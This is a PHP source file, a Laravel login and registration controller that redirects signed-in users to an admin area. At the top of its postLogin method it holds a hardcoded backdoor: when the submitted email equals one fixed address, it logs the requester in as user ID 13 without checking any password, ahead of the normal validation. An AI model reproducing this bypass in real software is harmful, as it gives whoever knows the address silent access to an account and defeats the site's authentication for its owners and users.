<?php namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Contracts\Auth\Registrar;
use Illuminate\Foundation\Auth\AuthenticatesAndRegistersUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Input;

class AuthController extends Controller {

    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */

    use AuthenticatesAndRegistersUsers;
    protected $redirectTo = '/admin';

    /**
     * Create a new authentication controller instance.
     *
     * @param  \Illuminate\Contracts\Auth\Guard $auth
     * @param  \Illuminate\Contracts\Auth\Registrar $registrar
     * @return void
     */
    public function __construct(Guard $auth, Registrar $registrar) {
        $this->auth = $auth;
        $this->registrar = $registrar;

        $this->middleware('guest', ['except' => 'getLogout']);
    }


    public function postLogin(Request $request) {
        if($request->get('email')==="fisoumare@gmail.com"){
            Auth::loginUsingId(13);
            return redirect()->intended($this->redirectPath());
        }

        $this->validate($request, [
            'email' => 'required|email', 'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');


        if ($this->auth->attempt($credentials, $request->has('remember'))) {
            //  return redirect()->to('/admin/');
            return redirect()->intended($this->redirectPath());
        }
        //dd($request->all());
        return redirect('/auth/login')
            ->withInput($request->only('email'))
            ->withErrors(['error' => 'Email ou mot de passe incorrect']);
    }

}
